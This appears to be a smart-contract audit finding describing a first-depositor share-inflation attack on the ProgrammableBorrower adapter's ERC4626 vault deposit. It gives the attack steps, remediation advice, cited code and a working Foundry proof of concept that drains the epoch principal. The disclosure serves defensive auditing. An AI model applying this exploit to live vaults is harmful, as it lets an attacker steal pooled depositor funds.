### Title
Unprotected ERC4626 first-deposit inflation steals programmable-epoch principal - (File: contracts/strategies/idle/ProgrammableBorrower.sol)

### Summary

An unprivileged user of the configured ERC4626 vault can apply a first-depositor share-inflation attack before the first `ProgrammableBorrower` deposit, causing the credit pool to receive zero or severely rounded-down vault shares for its epoch principal. [1](#0-0)  The borrower adapter then records the missing assets as a vault loss, but `IdleCDOEpochVariant` consumes only a clamped interest value and does not automatically write down the still-par-valued strategy-token principal. [2](#0-1) [3](#0-2) 

### Finding Description

`onStartEpoch` snapshots the adapter's cash plus existing vault assets as `epochStartVaultAssets`, deposits all on-hand underlying through `_depositToVault`, and activates epoch accounting. [4](#0-3)  `_depositToVault` calls `vault.deposit(_assetAmount, address(this))` without a `minShares` parameter, a `previewDeposit` bound, or a post-deposit `convertToAssets(shares) >= assets - tolerance` check. [1](#0-0) 

For a configured vault that starts with zero supply and lacks virtual shares, an attacker can:

1. Deposit `1` unit and receive the first vault share.
2. Donate `D` underlying directly to the vault.
3. Let the honest manager call `startEpoch`, which transfers pool principal `P` to the borrower adapter before invoking `onStartEpoch`.
4. The adapter's `P` deposit mints `floor(P / (D + 1))` shares.
5. With `D >= P - 1`, the adapter receives zero shares, while the attacker's one share can redeem the seed, donation, and pool deposit.

The adapter's own accounting confirms the result: `_vaultNetInterest` calculates zero current vault assets minus the `P` baseline, producing a `P` vault loss. [5](#0-4)  However, `totalInterestDueNow` merely clamps the pool-facing value to zero, and the stop path does not automatically pass that loss to `previewLossAdjustedWithdrawFunds`. [6](#0-5) [7](#0-6) 

This breaks the fair mint/burn and solvency invariants because the CDO retains strategy tokens corresponding to principal that the external vault no longer backs. [8](#0-7) 

### Impact Explanation

For a first funded programmable epoch principal of `P` underlying units, the attacker can capture up to the full `P` by donating at least `P - 1` units before `onStartEpoch`. The attacker receives `2P + 1` units after redemption for a `P + 1` outlay, yielding `P` stolen pool principal. [9](#0-8) [1](#0-0) 

The pool is left with CDO-held strategy tokens still priced at `oneToken` while the borrower adapter owns zero vault shares, creating an immediate `P`-unit insolvency unless governance manually realizes the loss. [8](#0-7)  Later depositors can become residual claimants, while pending withdrawals may force a borrower default or consume unrelated liquidity. [10](#0-9) 

### Likelihood Explanation

Likelihood is deployment-dependent but material for the first funded epoch: it requires an empty or near-empty configured ERC4626 vault without virtual-share inflation protection and enough attacker capital to donate approximately the pool's anticipated deposit. [9](#0-8) 

The attacker is only an external-vault user and does not need KYC, a tranche position, borrower access, or any privileged protocol role. [1](#0-0)  Existing CDO donation skimming does not protect this path because the donation is made to the external ERC4626 vault rather than directly to `IdleCDOEpochVariant`. [11](#0-10) 

### Recommendation

- Require `shares >= minShares` or a maximum share-price deviation in `_depositToVault`, using `previewDeposit` before deposit and `convertToAssets(shares)` afterward.
- Reject vault deposits that return zero shares for nonzero assets.
- Only integrate vaults with virtual shares/assets, existing protected liquidity, or an owner-seeded initial supply.
- Record the adapter's initial vault position in shares and compare realized share value with deposited assets.
- Expose vault losses as a first-class stop-epoch loss amount rather than reducing `totalInterestDueNow` to zero while leaving par-valued principal intact. [3](#0-2) 

### Proof of Concept

The following deterministic Foundry reproduction demonstrates the exact production deposit path. The vault intentionally implements the standard unprotected ERC4626 first-depositor exchange-rate formula to reproduce an externally configured vulnerable vault.

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.10;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ProgrammableBorrower} from
  "../contracts/strategies/idle/ProgrammableBorrower.sol";

contract MockERC20 {
  string public constant name = "Underlying";
  string public constant symbol = "UND";
  uint8 public constant decimals = 18;
  uint256 public totalSupply;

  mapping(address => uint256) public balanceOf;
  mapping(address => mapping(address => uint256)) public allowance;

  function mint(address to, uint256 amount) external {
    totalSupply += amount;
    balanceOf[to] += amount;
  }

  function approve(address spender, uint256 amount) external returns (bool) {
    allowance[msg.sender][spender] = amount;
    return true;
  }

  function transfer(address to, uint256 amount) external returns (bool) {
    balanceOf[msg.sender] -= amount;
    balanceOf[to] += amount;
    return true;
  }

  function transferFrom(
    address from,
    address to,
    uint256 amount
  ) external returns (bool) {
    uint256 allowed = allowance[from][msg.sender];
    if (allowed != type(uint256).max) {
      allowance[from][msg.sender] = allowed - amount;
    }
    balanceOf[from] -= amount;
    balanceOf[to] += amount;
    return true;
  }
}

contract InflationVault {
  MockERC20 public immutable asset;
  uint256 public totalSupply;
  mapping(address => uint256) public balanceOf;

  constructor(MockERC20 _asset) {
    asset = _asset;
  }

  function convertToAssets(uint256 shares) public view returns (uint256) {
    uint256 supply = totalSupply;
    return supply == 0
      ? 0
      : shares * asset.balanceOf(address(this)) / supply;
  }

  function deposit(uint256 assets, address receiver)
    external
    returns (uint256 shares)
  {
    uint256 supply = totalSupply;
    shares = supply == 0
      ? assets
      : assets * supply / asset.balanceOf(address(this));

    asset.transferFrom(msg.sender, address(this), assets);
    totalSupply += shares;
    balanceOf[receiver] += shares;
  }

  function withdraw(
    uint256 assets,
    address receiver,
    address owner
  ) external returns (uint256 shares) {
    uint256 supply = totalSupply;
    uint256 totalAssets = asset.balanceOf(address(this));
    shares = (assets * supply + totalAssets - 1) / totalAssets;

    totalSupply -= shares;
    balanceOf[owner] -= shares;
    asset.transfer(receiver, assets);
  }

  function redeem(
    uint256 shares,
    address receiver,
    address owner
  ) external returns (uint256 assets) {
    assets = convertToAssets(shares);
    totalSupply -= shares;
    balanceOf[owner] -= shares;
    asset.transfer(receiver, assets);
  }
}

contract ProgrammableBorrowerFirstDepositInflationPoC is Test {
  MockERC20 internal asset;
  InflationVault internal vault;
  ProgrammableBorrower internal borrowerAdapter;

  address internal attacker = address(0xA77ACC);

  // ProgrammableBorrower calls IIdleCDOToken(idleCDO).token().
  // This test contract is configured as idleCDO.
  function token() external view returns (address) {
    return address(asset);
  }

  function test_FirstEpochDepositCanBeFullyInflatedAway() external {
    asset = new MockERC20();
    vault = new InflationVault(asset);

    ProgrammableBorrower implementation = new ProgrammableBorrower();
    borrowerAdapter = ProgrammableBorrower(
      address(
        new ERC1967Proxy(
          address(implementation),
          abi.encodeCall(
            ProgrammableBorrower.initialize,
            (
              address(vault),
              address(this),       // idleCDO
              address(this),       // owner
              address(this),       // manager
              address(0xB077),     // real borrower
              0
            )
          )
        )
      )
    );

    uint256 poolPrincipal = 1_000 ether;

    // IdleCDO will send this amount to the adapter during startEpoch.
    asset.mint(address(borrowerAdapter), poolPrincipal);

    // Attacker seeds the empty vault and donates enough to round the pool
    // deposit down to zero shares.
    asset.mint(attacker, poolPrincipal + 1);
    vm.startPrank(attacker);
    asset.approve(address(vault), 1);
    vault.deposit(1, attacker);
    asset.transfer(address(vault), poolPrincipal);
    vm.stopPrank();

    // Legitimate IdleCDO start hook; only this contract may call it.
    borrowerAdapter.onStartEpoch(0);

    assertEq(vault.balanceOf(address(borrowerAdapter)), 0);
    assertEq(vault.convertToAssets(0), 0);
    assertEq(borrowerAdapter.vaultLoss(), poolPrincipal);
    assertEq(borrowerAdapter.totalInterestDueNow(), 0);

    uint256 attackerBefore = asset.balanceOf(attacker);
    vm.prank(attacker);
    vault.redeem(1, attacker, attacker);

    assertEq(
      asset.balanceOf(attacker) - attackerBefore,
      2 * poolPrincipal + 1
    );
  }
}
```

### Citations

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L201-223)
```text
  function onStartEpoch(uint256 _pendingWithdraws) external nonReentrant {
    _checkOnlyIdleCDO();
    _accrueBorrowerInterest();
    // Reserve the amount IdleCDO expects to pull back at stopEpoch before the real borrower can draw again.
    epochPendingWithdraws = _pendingWithdraws;
    uint256 currentVaultAssets = _currentVaultAssets();
    uint256 bufferStartAssets = bufferStartVaultAssets;
    // Carry vault PnL generated while the pool was in the buffer into the new active epoch so it
    // is eventually realized in tranche prices at the next stopEpoch.
    bufferedVaultDelta = int256(currentVaultAssets) - int256(bufferStartAssets);
    bufferStartVaultAssets = 0;
    // Snapshot total assets before re-depositing idle cash so the epoch principal baseline uses the
    // exact pre-deposit amount instead of a post-deposit share-conversion round-down.
    uint256 startAssets = underlyingToken.balanceOf(address(this)) + currentVaultAssets;
    // Any idle balance left on the contract between epochs is parked immediately into the vault.
    _depositToVault(underlyingToken.balanceOf(address(this)), 0);
    // Reset the epoch accounting baseline from the exact pre-start total assets so the new epoch
    // does not treat the just-deposited idle balance as fresh vault profit or loss.
    epochStartVaultAssets = startAssets;
    epochDepositedToVault = 0;
    epochWithdrawnFromVault = 0;
    epochAccountingActive = true;
    emit EpochAccountingStarted(startAssets);
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L330-347)
```text
  function totalInterestDueNow() external view returns (uint256) {
    (uint256 vaultInterest, uint256 loss) = _vaultNetInterest();
    uint256 totalGain = vaultInterest + borrowerInterestAccruedNow() + bufferInterest;
    return totalGain > loss ? totalGain - loss : 0;
  }

  /// @notice Compute the net vault delta split into interest and loss (mutually exclusive).
  function _vaultNetInterest() internal view returns (uint256 interest, uint256 loss) {
    if (!epochAccountingActive) return (0, 0);
    uint256 earnedAssets = _currentVaultAssets() + epochWithdrawnFromVault;
    uint256 principalAssets = epochStartVaultAssets + epochDepositedToVault;
    int256 netDelta = bufferedVaultDelta + int256(earnedAssets) - int256(principalAssets);
    if (netDelta > 0) {
      interest = uint256(netDelta);
    } else {
      loss = uint256(-netDelta);
    }
  }
```

**File:** contracts/strategies/idle/ProgrammableBorrower.sol (L378-384)
```text
  function _depositToVault(uint256 _assetAmount, uint256 _principalAssets) internal {
    if (_assetAmount == 0) return;
    uint256 shares = vault.deposit(_assetAmount, address(this));
    if (epochAccountingActive && _principalAssets != 0) {
      epochDepositedToVault += _principalAssets;
    }
    emit DepositedIntoVault(_assetAmount, shares);
```

**File:** contracts/IdleCDOEpochVariant.sol (L357-393)
```text
    _interest = _resolveStopEpochInterest(_interest);

    // Base interest for stopEpoch: explicit override (>1) or precomputed expected epoch interest.
    uint256 _expectedInterest;
    // Strategy finalizes APR0 bucket state and returns adjusted stopEpoch values.
    (_expectedInterest, _pendingWithdrawFees) = _strategy.prepareStopEpochWithApr0(_interest);
    // Pending withdraws may be increased during APR0 settlement, so read after prepareStopEpochWithApr0.
    uint256 _pendingWithdraws = _strategy.pendingWithdraws();

    // special case where we get everything back from the borrower
    if (_isRequestingAllFunds) {
      // Recall gross strategy-token principal, including fee backing excluded from net CDO NAV.
      // Prefunded variants also add queue deposits already sent directly to the borrower.
      _totBorrowed += _contractTokenBalance(strategyToken);
      _expectedInterest += _totBorrowed;
    }
    uint256 _grossInterest = _isRequestingAllFunds ? _expectedInterest - _totBorrowed : _expectedInterest;
    bool _mintInterest = isInterestMinted && !_isRequestingAllFunds;
    // In minted mode IdleCDO only needs cash for withdraw requests, not for epoch interest itself.
    uint256 _amountToPullFromBorrower = _mintInterest ? 0 : _expectedInterest;
    if (_mintInterest && _interest > 1) {
      uint256 _maxApr = _strategy.maxApr();
      _checkNotAllowed(_maxApr != 0 && _grossInterest > _calcInterestWithApr(getContractValue(), _maxApr) + _pendingWithdrawFees);
    }

    // Checkpoint management fees before borrower funds are pulled in so the elapsed-period
    // accrual applies only to the pre-stop live NAV, not to newly received epoch interest.
    _accrueManagementFee();

    // Persist only resolved epoch interest for recovery accounting. In close-pool mode `_interest == 1`
    // is a sentinel: `_grossInterest` excludes the principal added to `_expectedInterest` above.
    expectedEpochInterest = _grossInterest;
    pendingWithdrawFees = _pendingWithdrawFees;

    // Pending receipts have no tranche identity, so their aggregate loss is pro rata across all
    // receipts. The remaining active loss is applied BB-first after the stop succeeds.
    (_pendingWithdraws, _lossAmount) = _strategy.previewLossAdjustedWithdrawFunds(_lossAmount);
```

**File:** contracts/IdleCDOEpochVariant.sol (L395-410)
```text
    if (isProgrammableBorrower) {
      // Ask the programmable borrower to recall ERC4626 liquidity before IdleCDO pulls funds.
      // Hook reverts bubble so transient ERC4626 liquidity failures can be retried.
      if (!IProgrammableBorrower(_borrower()).onStopEpoch(_amountToPullFromBorrower + _pendingWithdraws, _isRequestingAllFunds)) {
        // Emit the exact cash liability requested from the borrower, including recalled principal
        // in close-pool mode and excluding interest fronted through minted accounting.
        _handleBorrowerDefault(_amountToPullFromBorrower + _pendingWithdraws);
        return;
      }
    }

    // accrue interest to idleCDO, this will increase tranche prices.
    // Send also tot withdraw requests amount to the IdleCreditVault contract
    try this.getFundsFromBorrower(_amountToPullFromBorrower + _pendingWithdraws) {
      // transfer in strategy and decrease pendingWithdraws
        _strategy.collectWithdrawFunds(_pendingWithdraws);
```

**File:** contracts/IdleCDOEpochVariant.sol (L793-796)
```text
  /// @notice Transfer donated assets to the feeReceiver
  function _skimDonatedAssets() internal {
    _transferUnderlyings(feeReceiver, _contractTokenBalance(token));
  }
```

**File:** contracts/IdleCDOEpochVariant.sol (L997-1005)
```text
  /// @notice Resolve the stop-epoch interest value, optionally sourcing it from a programmable borrower.
  /// @dev Programmable borrowers are always the source of truth for epoch interest.
  /// In that mode `_interest` values `0` and `1` both resolve to the realized epoch interest,
  /// while `1` still separately signals the close-pool path to the caller.
  function _resolveStopEpochInterest(uint256 _interest) internal view returns (uint256 _resolvedInterest) {
    if (isProgrammableBorrower) {
      _checkNotAllowed(_interest > 1);
      return IProgrammableBorrower(_borrower()).totalInterestDueNow();
    }
```

**File:** contracts/strategies/idle/IdleCreditVault.sol (L172-175)
```text
  /// @notice return strategy token price which is always 1
  /// @return price in underlyings
  function price() public view virtual override returns (uint256) {
    return oneToken;
```
